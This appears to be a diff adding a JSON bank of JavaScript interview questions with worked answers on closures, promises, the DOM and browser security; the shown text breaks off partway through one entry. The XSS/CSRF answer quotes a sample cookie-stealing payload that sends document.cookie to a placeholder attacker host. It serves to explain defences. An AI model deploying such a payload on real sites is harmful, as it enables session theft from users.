@@ -1,0 +1,1461 @@
+[
+  {
+    "id": "debounce",
+    "companies": [
+      "Google",
+      "Amazon",
+      "TikTok",
+      "Uber"
+    ],
+    "title": "Implement debounce(fn, delay)",
+    "difficulty": "medium",
+    "category": "Closures & Scope",
+    "description": "Write a `debounce` function that delays invoking `fn` until after `delay` ms have elapsed since the last call. Commonly used on search inputs and resize handlers.",
+    "answerType": "code",
+    "tags": [
+      "closures",
+      "timers",
+      "higher-order functions"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "function debounce(fn, delay) {\n  let timer = null\n\n  return function (...args) {\n    clearTimeout(timer)\n    timer = setTimeout(() => {\n      fn.apply(this, args)\n    }, delay)\n  }\n}\n\n// Usage\nconst search = debounce((query) => fetchResults(query), 300)\ninput.addEventListener('input', (e) => search(e.target.value))",
+    "order": 0
+  },
+  {
+    "id": "throttle",
+    "companies": [
+      "Google",
+      "Amazon",
+      "Uber",
+      "TikTok"
+    ],
+    "title": "Implement throttle(fn, delay)",
+    "difficulty": "medium",
+    "category": "Closures & Scope",
+    "description": "Write a `throttle` function that ensures `fn` is called at most once per `delay` ms window, with a leading call and a trailing call guaranteed.",
+    "answerType": "code",
+    "tags": [
+      "closures",
+      "timers",
+      "performance"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "function throttle(fn, delay) {\n  let lastCall = 0\n  let timer = null\n\n  return function (...args) {\n    const remaining = delay - (Date.now() - lastCall)\n    clearTimeout(timer)\n\n    if (remaining <= 0) {\n      fn.apply(this, args)\n      lastCall = Date.now()\n    } else {\n      // trailing call — always fire with the latest args\n      timer = setTimeout(() => {\n        fn.apply(this, args)\n        lastCall = Date.now()\n      }, remaining)\n    }\n  }\n}\n\n// Usage\nconst onScroll = throttle(() => {\n  console.log('sync virtualized rows')\n}, 100)\nwindow.addEventListener('scroll', onScroll)",
+    "order": 1
+  },
+  {
+    "id": "memoize",
+    "companies": [
+      "Google",
+      "Meta",
+      "Amazon"
+    ],
+    "title": "Implement memoize(fn)",
+    "difficulty": "medium",
+    "category": "Closures & Scope",
+    "description": "Write a `memoize` function that caches the results of function calls. Subsequent calls with the same arguments should return the cached result without re-running the function.",
+    "answerType": "code",
+    "tags": [
+      "closures",
+      "caching",
+      "performance"
+    ],
+    "answer": "function memoize(fn) {\n  const cache = new Map()\n\n  return function (...args) {\n    const key = JSON.stringify(args)\n    if (cache.has(key)) return cache.get(key)\n\n    const result = fn.apply(this, args)\n    cache.set(key, result)\n    return result\n  }\n}\n\n// Usage\nfunction expensiveFib(n) {\n  if (n <= 1) return n\n  return expensiveFib(n - 1) + expensiveFib(n - 2)\n}\nconst fib = memoize(expensiveFib)\nfib(40) // computed\nfib(40) // instant cache hit",
+    "order": 2
+  },
+  {
+    "id": "curry",
+    "companies": [
+      "Meta",
+      "Google"
+    ],
+    "title": "Implement curry(fn)",
+    "difficulty": "hard",
+    "category": "Closures & Scope",
+    "description": "Write a `curry` function that transforms a multi-argument function into a sequence of unary functions. `curry(add)(1)(2)(3)` should equal `add(1, 2, 3)`.",
+    "answerType": "code",
+    "tags": [
+      "closures",
+      "functional programming",
+      "recursion"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "function curry(fn) {\n  return function curried(...args) {\n    if (args.length >= fn.length) {\n      return fn.apply(this, args)\n    }\n    return function (...moreArgs) {\n      return curried.apply(this, args.concat(moreArgs))\n    }\n  }\n}\n\n// Usage\nfunction add(a, b, c) { return a + b + c }\nconst curriedAdd = curry(add)\n\ncurriedAdd(1)(2)(3)     // 6\ncurriedAdd(1, 2)(3)     // 6\ncurriedAdd(1)(2, 3)     // 6\ncurriedAdd(1, 2, 3)     // 6",
+    "order": 3
+  },
+  {
+    "id": "closures-explain",
+    "companies": [
+      "Google",
+      "Meta",
+      "Amazon",
+      "Airbnb"
+    ],
+    "title": "Explain closures — and the classic loop bug",
+    "difficulty": "easy",
+    "category": "Closures & Scope",
+    "description": "What is a closure? Demonstrate the classic `var` loop bug and fix it using a closure, `let`, or IIFE.",
+    "answerType": "code",
+    "tags": [
+      "closures",
+      "var",
+      "let",
+      "scope"
+    ],
+    "answer": "// Usage\n// A closure is a function that retains access to its outer\n// (enclosing) scope even after the outer function has returned.\n\nfunction makeCounter() {\n  let count = 0              // captured by the returned function\n  return () => ++count       // this is the closure\n}\nconst counter = makeCounter()\ncounter() // 1\ncounter() // 2\n\n// ─────────────────────────────────────────────────────────\n// Classic loop bug with var\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100)\n}\n// Prints: 3, 3, 3  — all share the same 'i' variable\n\n// Fix 1: use let (block-scoped, new binding per iteration)\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100)\n}\n// Prints: 0, 1, 2\n\n// Fix 2: IIFE to capture each value\nfor (var i = 0; i < 3; i++) {\n  (function(j) {\n    setTimeout(() => console.log(j), 100)\n  })(i)\n}",
+    "order": 4
+  },
+  {
+    "id": "hoisting",
+    "companies": [
+      "Amazon",
+      "Apple"
+    ],
+    "title": "Explain hoisting",
+    "difficulty": "easy",
+    "category": "Closures & Scope",
+    "description": "What is hoisting? How does it differ for `var`, `let`/`const`, and function declarations vs expressions?",
+    "answerType": "code",
+    "tags": [
+      "hoisting",
+      "var",
+      "tdz",
+      "function declarations"
+    ],
+    "answer": "// Usage\n// Hoisting: declarations are moved to the top of their scope\n// during the compile phase. Only the declaration is hoisted,\n// not the initialisation.\n\n// var — hoisted and initialised to undefined\nconsole.log(x) // undefined (no error)\nvar x = 5\nconsole.log(x) // 5\n\n// let/const — hoisted but NOT initialised (Temporal Dead Zone)\nconsole.log(y) // ReferenceError: Cannot access 'y' before init\nlet y = 10\n\n// Function declarations — fully hoisted (name + body)\ngreet() // \"Hello!\" — works before the declaration\nfunction greet() { console.log('Hello!') }\n\n// Function expressions — only the variable is hoisted\nsayHi() // TypeError: sayHi is not a function\nvar sayHi = function() { console.log('Hi!') }\n\n// Key rule: prefer const/let and declare before use.",
+    "order": 5
+  },
+  {
+    "id": "promise-all",
+    "companies": [
+      "Meta",
+      "TikTok",
+      "Apple",
+      "Amazon"
+    ],
+    "title": "Implement Promise.all(promises)",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement `Promise.all` from scratch. It should resolve with an array of results when all promises resolve, and reject immediately if any promise rejects.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "async",
+      "concurrency"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "function promiseAll(promises) {\n  return new Promise((resolve, reject) => {\n    if (promises.length === 0) return resolve([])\n\n    const results = new Array(promises.length)\n    let remaining = promises.length\n\n    promises.forEach((promise, i) => {\n      Promise.resolve(promise).then((value) => {\n        results[i] = value\n        remaining -= 1\n        if (remaining === 0) resolve(results)\n      }).catch(reject)   // first rejection wins\n    })\n  })\n}\n\n// Test\npromiseAll([\n  Promise.resolve(1),\n  Promise.resolve(2),\n  Promise.resolve(3),\n]).then(console.log)  // [1, 2, 3]\n\npromiseAll([\n  Promise.resolve(1),\n  Promise.reject('error'),\n]).catch(console.error) // 'error'",
+    "order": 6
+  },
+  {
+    "id": "promise-allsettled",
+    "companies": [
+      "Meta",
+      "Google"
+    ],
+    "title": "Implement Promise.allSettled(promises)",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Implement `Promise.allSettled` — unlike `Promise.all`, it waits for all promises and returns an array of `{ status, value/reason }` objects, never rejecting.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "async"
+    ],
+    "answer": "function promiseAllSettled(promises) {\n  return Promise.all(\n    promises.map(p =>\n      Promise.resolve(p)\n        .then(value  => ({ status: 'fulfilled', value }))\n        .catch(reason => ({ status: 'rejected',  reason }))\n    )\n  )\n}\n\n// Test\npromiseAllSettled([\n  Promise.resolve(1),\n  Promise.reject('oops'),\n  Promise.resolve(3),\n]).then(console.log)\n// [\n//   { status: 'fulfilled', value: 1 },\n//   { status: 'rejected',  reason: 'oops' },\n//   { status: 'fulfilled', value: 3 },\n// ]",
+    "order": 7
+  },
+  {
+    "id": "promises-sequence",
+    "companies": [
+      "Apple",
+      "Amazon",
+      "Stripe"
+    ],
+    "title": "Execute an array of async tasks in sequence",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Given an array of async functions (each returning a Promise), execute them one after another — not concurrently — and collect the results.",
+    "answerType": "code",
+    "tags": [
+      "promises",
+      "async",
+      "reduce"
+    ],
+    "answer": "// Using Array.reduce\nfunction runSequential(tasks) {\n  return tasks.reduce(\n    (chain, task) => chain.then(results =>\n      task().then(value => [...results, value])\n    ),\n    Promise.resolve([])\n  )\n}\n\n// Using async/await (often cleaner in interviews)\nasync function runSequential(tasks) {\n  const results = []\n  for (const task of tasks) {\n    results.push(await task())\n  }\n  return results\n}\n\n// Test\nconst tasks = [\n  () => Promise.resolve(1),\n  () => new Promise(res => setTimeout(() => res(2), 100)),\n  () => Promise.resolve(3),\n]\nrunSequential(tasks).then(console.log) // [1, 2, 3]",
+    "order": 8
+  },
+  {
+    "id": "event-loop",
+    "companies": [
+      "Amazon",
+      "Uber",
+      "Google",
+      "Tenable"
+    ],
+    "title": "Explain the Event Loop — what is the output order?",
+    "difficulty": "medium",
+    "category": "Async & Promises",
+    "description": "Explain the JavaScript event loop, call stack, microtask queue, and macrotask queue. What order does the following code execute?",
+    "answerType": "code",
+    "tags": [
+      "event loop",
+      "microtasks",
+      "macrotasks",
+      "promises"
+    ],
+    "answer": "// Usage\n// Use this pattern to reason about callback ordering in bug reports.\nconsole.log('1')               // sync — runs first\n\nsetTimeout(() => {\n  console.log('2')             // macrotask — runs last\n}, 0)\n\nPromise.resolve().then(() => {\n  console.log('3')             // microtask — runs before macrotask\n})\n\nconsole.log('4')               // sync — runs second\n\n// Output: 1, 4, 3, 2\n\n// ─────────────────────────────────────────────────────────\n// How it works:\n// 1. Synchronous code runs on the call stack first.\n// 2. After the stack clears, ALL microtasks run (Promise\n//    .then, queueMicrotask, MutationObserver).\n// 3. Then ONE macrotask runs (setTimeout, setInterval,\n//    I/O, UI rendering).\n// 4. After that macrotask, microtasks flush again.\n// 5. Repeat.\n\n// Key: microtasks always drain before the next macrotask.",
+    "order": 9
+  },
+  {
+    "id": "implement-bind",
+    "companies": [
+      "TikTok",
+      "Apple",
+      "Meta"
+    ],
+    "title": "Implement Function.prototype.bind",
+    "difficulty": "medium",
+    "category": "Prototypes & OOP",
+    "description": "Implement your own version of `Function.prototype.bind`. It should return a new function with `this` permanently bound and support partial application. Bonus: handle `new` correctly.",
+    "answerType": "code",
+    "tags": [
+      "this",
+      "prototype",
+      "bind",
+      "new"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "Function.prototype.myBind = function(thisArg, ...boundArgs) {\n  const fn = this  // the original function\n\n  return function bound(...callArgs) {\n    // When used with 'new', ignore the bound 'this'\n    if (new.target) {\n      return new fn(...boundArgs, ...callArgs)\n    }\n    return fn.apply(thisArg, [...boundArgs, ...callArgs])\n  }\n}\n\n// Usage\nfunction greet(greeting, punctuation) {\n  return `${greeting}, ${this.name}${punctuation}`\n}\n\nconst user = { name: 'Alice' }\nconst sayHi = greet.myBind(user, 'Hello')\nsayHi('!')   // \"Hello, Alice!\"\nsayHi('?')   // \"Hello, Alice?\"",
+    "order": 10
+  },
+  {
+    "id": "event-emitter",
+    "companies": [
+      "TikTok",
+      "Meta",
+      "Airbnb"
+    ],
+    "title": "Implement an EventEmitter class",
+    "difficulty": "medium",
+    "category": "Prototypes & OOP",
+    "description": "Implement a Node.js-style `EventEmitter` with `on`, `off`, `emit`, and `once` methods.",
+    "answerType": "code",
+    "tags": [
+      "classes",
+      "observer pattern",
+      "events"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "class EventEmitter {\n  constructor() {\n    this._events = {}\n  }\n\n  on(event, listener) {\n    if (!this._events[event]) this._events[event] = []\n    this._events[event].push(listener)\n    return this  // for chaining\n  }\n\n  off(event, listener) {\n    if (!this._events[event]) return this\n    this._events[event] = this._events[event]\n      .filter(l => l !== listener && l._original !== listener)\n    return this\n  }\n\n  emit(event, ...args) {\n    if (!this._events[event]) return false\n    this._events[event].forEach(listener => listener(...args))\n    return true\n  }\n\n  once(event, listener) {\n    const wrapper = (...args) => {\n      listener(...args)\n      this.off(event, wrapper)\n    }\n    wrapper._original = listener\n    return this.on(event, wrapper)\n  }\n}\n\n// Usage\nconst emitter = new EventEmitter()\nemitter.on('data', (msg) => console.log('received:', msg))\nemitter.once('connect', () => console.log('connected!'))\n\nemitter.emit('connect')  // \"connected!\"\nemitter.emit('connect')  // (nothing — once removed itself)\nemitter.emit('data', 'hello')  // \"received: hello\"",
+    "order": 11
+  },
+  {
+    "id": "this-binding",
+    "companies": [
+      "Google",
+      "Amazon",
+      "Meta"
+    ],
+    "title": "Explain `this` — 4 binding rules",
+    "difficulty": "medium",
+    "category": "Prototypes & OOP",
+    "description": "Describe the four rules that determine the value of `this` in JavaScript: default, implicit, explicit, and `new` binding. What does each of these log?",
+    "answerType": "code",
+    "tags": [
+      "this",
+      "binding",
+      "arrow functions"
+    ],
+    "answer": "// Usage\n// Use this checklist whenever \"this\" is unexpected in handlers/classes.\n// 1. Default binding — 'this' is globalThis (undefined in strict)\nfunction show() { console.log(this) }\nshow()  // window / undefined (strict)\n\n// 2. Implicit binding — 'this' is the object before the dot\nconst obj = { name: 'Alice', greet() { console.log(this.name) } }\nobj.greet()  // \"Alice\"\nconst fn = obj.greet\nfn()         // undefined — lost implicit binding!\n\n// 3. Explicit binding — call / apply / bind\nfunction greet() { console.log(this.name) }\ngreet.call({ name: 'Bob' })   // \"Bob\"\ngreet.apply({ name: 'Carol'}) // \"Carol\"\nconst bound = greet.bind({ name: 'Dave' })\nbound()                        // \"Dave\"\n\n// 4. new binding — 'this' is the newly created object\nfunction Person(name) { this.name = name }\nconst p = new Person('Eve')\nconsole.log(p.name) // \"Eve\"\n\n// Arrow functions — no own 'this', inherit from lexical scope\nconst counter = {\n  count: 0,\n  start() {\n    setInterval(() => {\n      this.count++ // 'this' is counter, not the interval callback\n    }, 1000)\n  }\n}",
+    "order": 12
+  },
+  {
+    "id": "prototypal-inheritance",
+    "companies": [
+      "Google",
+      "Amazon"
+    ],
+    "title": "Explain prototypal inheritance",
+    "difficulty": "medium",
+    "category": "Prototypes & OOP",
+    "description": "How does the prototype chain work in JavaScript? Implement inheritance using both the classic prototype pattern and ES6 classes.",
+    "answerType": "code",
+    "tags": [
+      "prototype",
+      "inheritance",
+      "classes",
+      "__proto__"
+    ],
+    "answer": "// Usage\n// Use inheritance for shared behavior and polymorphism.\n// Every object has a [[Prototype]] link to another object.\n// Property lookup walks up the chain until null is reached.\n\n// ── ES6 classes (syntactic sugar over prototypes) ──\nclass Animal {\n  constructor(name) { this.name = name }\n  speak() { return `${this.name} makes a noise.` }\n}\n\nclass Dog extends Animal {\n  speak() { return `${this.name} barks.` }\n}\n\nconst d = new Dog('Rex')\nd.speak()              // \"Rex barks.\"\nd instanceof Dog       // true\nd instanceof Animal    // true\n\n// ── Same thing with raw prototypes ──\nfunction Animal(name) { this.name = name }\nAnimal.prototype.speak = function() {\n  return `${this.name} makes a noise.`\n}\n\nfunction Dog(name) { Animal.call(this, name) }\nDog.prototype = Object.create(Animal.prototype)\nDog.prototype.constructor = Dog\nDog.prototype.speak = function() {\n  return `${this.name} barks.`\n}\n\n// ── Object.create for pure prototype chains ──\nconst animal = { speak() { return 'noise' } }\nconst dog = Object.create(animal)\ndog.speak() // \"noise\" — found on animal via prototype chain",
+    "order": 13
+  },
+  {
+    "id": "deep-clone",
+    "companies": [
+      "TikTok",
+      "Airbnb",
+      "Google"
+    ],
+    "title": "Deep clone an object",
+    "difficulty": "medium",
+    "category": "Algorithms",
+    "description": "Write a `deepClone` function that creates a complete deep copy of a value, handling nested objects, arrays, dates, null, and circular references.",
+    "answerType": "code",
+    "tags": [
+      "recursion",
+      "objects",
+      "cloning"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "// Production approach (handles most cases)\nfunction deepClone(value, seen = new WeakMap()) {\n  if (value === null || typeof value !== 'object') return value\n  if (value instanceof Date) return new Date(value)\n  if (value instanceof RegExp) return new RegExp(value)\n\n  // Handle circular references\n  if (seen.has(value)) return seen.get(value)\n\n  const clone = Array.isArray(value) ? [] : {}\n  seen.set(value, clone)\n\n  for (const key of Object.keys(value)) {\n    clone[key] = deepClone(value[key], seen)\n  }\n  return clone\n}\n\n// Usage\nconst obj = { a: 1, b: { c: [1, 2, 3] }, d: new Date() }\nconst copy = deepClone(obj)\ncopy.b.c.push(4)\nconsole.log(obj.b.c)   // [1, 2, 3] — original untouched\n\n// Quick alternative for plain data (no Date, no undefined, no circular)\nconst quick = JSON.parse(JSON.stringify(obj))\n\n// Modern: structuredClone (native, handles most types)\nconst native = structuredClone(obj)",
+    "order": 14
+  },
+  {
+    "id": "flatten-array",
+    "companies": [
+      "Meta",
+      "Amazon",
+      "Apple",
+      "TikTok"
+    ],
+    "title": "Implement Array.prototype.flat",
+    "difficulty": "easy",
+    "category": "Algorithms",
+    "description": "Implement `flat(arr, depth)` that flattens a nested array to the given depth. Also implement `Array.prototype.flat` on the prototype.",
+    "answerType": "code",
+    "tags": [
+      "arrays",
+      "recursion",
+      "prototype"
+    ],
+    "source": "frontendinterviewhandbook.com",
+    "answer": "// Recursive implementation\nfunction flat(arr, depth = 1) {\n  if (depth === 0) return arr.slice()\n\n  return arr.reduce((result, item) => {\n    if (Array.isArray(item) && depth > 0) {\n      result.push(...flat(item, depth - 1))\n    } else {\n      result.push(item)\n    }\n    return result\n  }, [])\n}\n\n// Polyfill on Array.prototype\nArray.prototype.myFlat = function(depth = 1) {\n  return flat(this, depth)\n}\n\n// Tests\nflat([1, [2, [3, [4]]]])          // [1, 2, [3, [4]]]\nflat([1, [2, [3, [4]]]], 2)       // [1, 2, 3, [4]]\nflat([1, [2, [3, [4]]]], Infinity) // [1, 2, 3, 4]\n\n// One-liner alternatives\nconst flatAlt = (arr, d = 1) =>\n  d > 0\n    ? arr.reduce((a, v) => a.concat(Array.isArray(v) ? flatAlt(v, d - 1) : v), [])\n    : arr.slice()",
+    "order": 15
+  },
+  {
+    "id": "classnames",
+    "companies": [
+      "Meta"
+    ],
+    "title": "Implement classnames()",
+    "difficulty": "easy",
+    "category": "Algorithms",
+    "description": "Implement the popular `classnames` utility that conditionally joins class names. It should handle strings, objects, arrays, and falsy values.",
+    "answerType": "code",
+    "tags": [
+      "utility",
+      "string manipulation"
+    ],
+    "source": "frontendinterviewhandbook.com — Meta",
+    "answer": "function classnames(...args) {\n  const classes = []\n\n  for (const arg of args) {\n    if (!arg) continue  // skip falsy values\n\n    if (typeof arg === 'string' || typeof arg === 'number') {\n      classes.push(arg)\n    } else if (Array.isArray(arg)) {\n      const inner = classnames(...arg)\n      if (inner) classes.push(inner)\n    } else if (typeof arg === 'object') {\n      for (const [key, value] of Object.entries(arg)) {\n        if (value) classes.push(key)\n      }\n    }\n  }\n\n  return classes.join(' ')\n}\n\n// Usage\nclassnames('foo', 'bar')               // \"foo bar\"\nclassnames('foo', { bar: true })       // \"foo bar\"\nclassnames({ foo: true, bar: false })  // \"foo\"\nclassnames('foo', ['bar', 'baz'])      // \"foo bar baz\"\nclassnames(null, undefined, 0, false)  // \"\"",
+    "order": 16
+  },
+  {
+    "id": "lru-cache",
+    "companies": [
+      "Google",
+      "Amazon",
+      "Netflix"
+    ],
+    "title": "Implement an LRU Cache",
+    "difficulty": "hard",
+    "category": "Algorithms",
+    "description": "Design a Least Recently Used (LRU) Cache with `get(key)` and `put(key, value)` operations, both O(1). When capacity is exceeded, evict the least recently used entry.",
+    "answerType": "code",
+    "tags": [
+      "data structures",
+      "Map",
+      "linked list",
+      "O(1)"
+    ],
+    "answer": "class LRUCache {\n  constructor(capacity) {\n    this.capacity = capacity\n    this.cache = new Map()   // Map preserves insertion order\n  }\n\n  get(key) {\n    if (!this.cache.has(key)) return -1\n\n    // Move to end (most recently used)\n    const value = this.cache.get(key)\n    this.cache.delete(key)\n    this.cache.set(key, value)\n    return value\n  }\n\n  put(key, value) {\n    if (this.cache.has(key)) this.cache.delete(key)\n    else if (this.cache.size >= this.capacity) {\n      // Delete least recently used (first key in Map)\n      this.cache.delete(this.cache.keys().next().value)\n    }\n    this.cache.set(key, value)\n  }\n}\n\n// Test\nconst lru = new LRUCache(2)\nlru.put(1, 1)\nlru.put(2, 2)\nlru.get(1)     // 1   — 1 is now most recently used\nlru.put(3, 3)  // evicts key 2\nlru.get(2)     // -1  — evicted\nlru.get(3)     // 3",
+    "order": 17
+  },
+  {
+    "id": "virtual-dom",
+    "companies": [
+      "Meta",
+      "Google"
+    ],
+    "title": "Convert a virtual DOM object into real DOM",
+    "difficulty": "hard",
+    "category": "DOM & Browser",
+    "description": "Given a JSON object representing a virtual DOM tree (`{ type, props, children }`), write a function that creates the corresponding actual DOM elements recursively.",
+    "answerType": "code",
+    "tags": [
+      "DOM",
+      "recursion",
+      "virtual DOM"
+    ],
+    "source": "javascript.plainenglish.io — Meta",
+    "answer": "/*\n  Input shape:\n  {\n    type: 'div',\n    props: { class: 'container', id: 'app' },\n    children: [\n      { type: 'h1', props: {}, children: ['Hello World'] },\n      { type: 'p',  props: { class: 'text' }, children: ['Paragraph'] }\n    ]\n  }\n*/\n\nfunction createElement(vnode) {\n  // Text node\n  if (typeof vnode === 'string' || typeof vnode === 'number') {\n    return document.createTextNode(String(vnode))\n  }\n\n  const { type, props = {}, children = [] } = vnode\n  const el = document.createElement(type)\n\n  // Set attributes / props\n  for (const [key, value] of Object.entries(props)) {\n    if (key === 'className') el.setAttribute('class', value)\n    else if (key.startsWith('on')) {\n      el.addEventListener(key.slice(2).toLowerCase(), value)\n    } else {\n      el.setAttribute(key, value)\n    }\n  }\n\n  // Recursively create children\n  for (const child of children) {\n    el.appendChild(createElement(child))\n  }\n\n  return el\n}\n\n// Usage (Mount)\ndocument.body.appendChild(createElement({\n  type: 'ul',\n  props: { class: 'list' },\n  children: [\n    { type: 'li', props: {}, children: ['Item 1'] },\n    { type: 'li', props: {}, children: ['Item 2'] },\n  ]\n}))",
+    "order": 18
+  },
+  {
+    "id": "event-delegation",
+    "companies": [
+      "Amazon",
+      "Stripe",
+      "Google"
+    ],
+    "title": "Explain event delegation — implement it",
+    "difficulty": "easy",
+    "category": "DOM & Browser",
+    "description": "What is event delegation and why is it useful? Implement a delegated click handler on a dynamic list.",
+    "answerType": "code",
+    "tags": [
+      "events",
+      "bubbling",
+      "delegation",
+      "performance"
+    ],
+    "answer": "// Usage\n// Event delegation = attach ONE listener to a parent instead\n// of many listeners on individual children.\n// Works because events bubble up the DOM tree.\n\n// ✗ Bad: listener on every item (expensive, misses dynamic items)\ndocument.querySelectorAll('.item').forEach(item => {\n  item.addEventListener('click', handleClick)\n})\n\n// ✓ Good: single listener on the parent\ndocument.querySelector('.list').addEventListener('click', (e) => {\n  const item = e.target.closest('.item')\n  if (!item) return               // click wasn't on an item\n\n  const id = item.dataset.id\n  console.log('Clicked item:', id)\n})\n\n// Advantages:\n// 1. One listener instead of N — less memory\n// 2. Works for dynamically added children automatically\n// 3. Easier to manage (add/remove in one place)\n\n// Custom delegate utility\nfunction delegate(parent, selector, event, handler) {\n  parent.addEventListener(event, (e) => {\n    const target = e.target.closest(selector)\n    if (target && parent.contains(target)) {\n      handler.call(target, e)\n    }\n  })\n}",
+    "order": 19
+  },
+  {
+    "id": "xss-csrf",
+    "companies": [
+      "Google",
+      "CrowdStrike",
+      "Tenable"
+    ],
+    "title": "XSS vs CSRF — how do you prevent them?",
+    "difficulty": "medium",
+    "category": "DOM & Browser",
+    "description": "Explain Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). How does each attack work, and what are the mitigations?",
+    "answerType": "mixed",
+    "tags": [
+      "security",
+      "XSS",
+      "CSRF",
+      "CSP"
+    ],
+    "source": "frontendinterviewhandbook.com — Google",
+    "answer": "// Usage\n// Apply these rules for all user-generated content and state-changing APIs.\n// XSS — attacker injects malicious scripts into your page\n// ────────────────────────────────────────────────────────\n// Attack: <img src=x onerror=\"fetch('evil.com?c='+document.cookie)\">\n// Mitigations:\n//  1. Escape/sanitise ALL user input before rendering to HTML\n//  2. Content Security Policy (CSP) header to whitelist sources\n//  3. HttpOnly cookies (JS can't read them)\n//  4. Use textContent instead of innerHTML\n//  5. DOMPurify library for rich-text HTML\n\n// ❌ Vulnerable\nel.innerHTML = userInput                      // dangerous\n// ✅ Safe\nel.textContent = userInput                    // auto-escaped\nel.innerHTML = DOMPurify.sanitize(userInput)  // if HTML needed\n\n// ─────────────────────────────────────────────────────────\n// CSRF — attacker tricks the browser into making auth'd requests\n// Attack: evil.com has a hidden form that POSTs to bank.com/transfer\n// Your browser sends the session cookie automatically.\n// Mitigations:\n//  1. CSRF tokens (server issues random token, validates on POST)\n//  2. SameSite=Strict/Lax cookie attribute\n//  3. Check Origin/Referer header on the server\n//  4. Require re-authentication for sensitive actions\n\n// Key difference:\n// XSS = attacker runs code IN your site (trust issue with input)\n// CSRF = attacker makes your browser make requests TO your site",
+    "order": 20
+  },
+  {
+    "id": "localstorage-vs-cookies",
+    "companies": [
+      "TikTok",
+      "Amazon",
+      "CrowdStrike"
+    ],
+    "title": "localStorage vs sessionStorage vs cookies",
+    "difficulty": "easy",
+    "category": "DOM & Browser",
+    "description": "Compare the three browser storage mechanisms: localStorage, sessionStorage, and cookies — covering size limits, persistence, security, and server access.",
+    "answerType": "mixed",
+    "tags": [
+      "storage",
+      "cookies",
+      "security",
+      "browser APIs"
+    ],
+    "answer": "//                localStorage  sessionStorage  cookies\n// ─────────────────────────────────────────────────────────\n// Capacity       ~5 MB         ~5 MB           ~4 KB\n// Persistence    Until cleared  Tab close       Configurable (Expires/Max-Age)\n// Sent to server No             No              Yes (every request — overhead)\n// JS accessible  Yes            Yes             Yes (unless HttpOnly)\n// Shared across  All tabs       Same tab only   All tabs (same origin)\n// tabs\n\n// When to use what:\n// cookies  — session tokens, auth state (set HttpOnly + Secure + SameSite)\n// localStorage  — user preferences, themes, non-sensitive app state\n// sessionStorage — wizard step state, temp form data\n\n// Security rules:\n// • Never store tokens in localStorage if XSS is a risk\n// • Always set HttpOnly on auth cookies (prevents JS access)\n// • Set Secure so cookies only travel over HTTPS\n// • Set SameSite=Strict/Lax to prevent CSRF\n\n// Usage\nlocalStorage.setItem('theme', 'dark')\nconst theme = localStorage.getItem('theme')\nlocalStorage.removeItem('theme')\nlocalStorage.clear()\n\n// Cookies\ndocument.cookie = 'name=value; SameSite=Strict; Secure; path=/'",
+    "order": 21
+  },
+  {
+    "id": "var-let-const",
+    "companies": [
+      "Amazon",
+      "Apple"
+    ],
+    "title": "`var` vs `let` vs `const`",
+    "difficulty": "easy",
+    "category": "ES6+",
+    "description": "What are the differences between `var`, `let`, and `const`? Cover scoping, hoisting, re-declaration, and the temporal dead zone.",
+    "answerType": "code",
+    "tags": [
+      "var",
+      "let",
+      "const",
+      "scope",
+      "tdz"
+    ],
+    "answer": "// Usage\n//           var           let             const\n// ─────────────────────────────────────────────────────────\n// Scope     function      block           block\n// Hoisted   yes (undef)   yes (TDZ err)   yes (TDZ err)\n// Re-decl   yes           no              no\n// Re-assign yes           yes             no (binding)\n\n// var — function scoped, leaks out of blocks\nfunction example() {\n  if (true) {\n    var x = 1    // accessible outside the if block\n    let y = 2    // block-scoped\n  }\n  console.log(x) // 1\n  console.log(y) // ReferenceError\n}\n\n// const — binding is constant, object properties can change\nconst arr = [1, 2, 3]\narr.push(4)   // ✅ mutating is fine\narr = []      // ❌ TypeError: assignment to constant variable\n\n// Temporal Dead Zone (TDZ)\nconsole.log(a) // undefined (var hoisted + init'd)\nconsole.log(b) // ReferenceError (let in TDZ)\nvar a = 1\nlet b = 2\n\n// Best practice: default to const, use let when reassignment\n// is needed, avoid var in modern code.",
+    "order": 22
+  },
+  {
+    "id": "equality",
+    "companies": [
+      "Amazon",
+      "Google"
+    ],
+    "title": "`==` vs `===` — type coercion rules",
+    "difficulty": "easy",
+    "category": "ES6+",
+    "description": "What is the difference between `==` (loose equality) and `===` (strict equality)? Give examples of surprising `==` coercion behaviour.",
+    "answerType": "code",
+    "tags": [
+      "coercion",
+      "equality",
+      "types"
+    ],
+    "answer": "// Usage\n// === strict equality: no type coercion\n1 === 1        // true\n1 === '1'      // false — different types\nnull === null  // true\nnull === undefined // false\n\n// == loose equality: coerces types (follow Abstract Equality algo)\n1 == '1'       // true  (string → number)\n0 == false     // true  (false → 0)\n0 == ''        // true  ('' → 0)\nnull == undefined  // true  (special rule)\nnull == 0      // false (null only == undefined)\nNaN == NaN     // false (NaN is never equal to anything)\n\n// Surprising cases\n[] == false    // true  ([] → '' → 0, false → 0)\n[] == ![]      // true  (![] is false, [] coerces to 0)\n'' == false    // true\n\n// Rule of thumb: always use ===\n// Exceptions: null == undefined is a common idiom to check\n// for \"neither null nor undefined\" in one check:\nfunction isNullish(val) {\n  return val == null  // catches both null and undefined\n}",
+    "order": 23
+  },
+  {
+    "id": "array-map",
+    "companies": [
+      "Apple"
+    ],
+    "title": "Implement Array.prototype.map from scratch",
+    "difficulty": "easy",
+    "category": "ES6+",
+    "description": "Implement `Array.prototype.myMap` that behaves identically to the native `Array.prototype.map`. Handle sparse arrays and the `thisArg` parameter.",
+    "answerType": "code",
+    "tags": [
+      "arrays",
+      "prototype",
+      "higher-order functions"
+    ],
+    "source": "frontendinterviewhandbook.com — Apple",
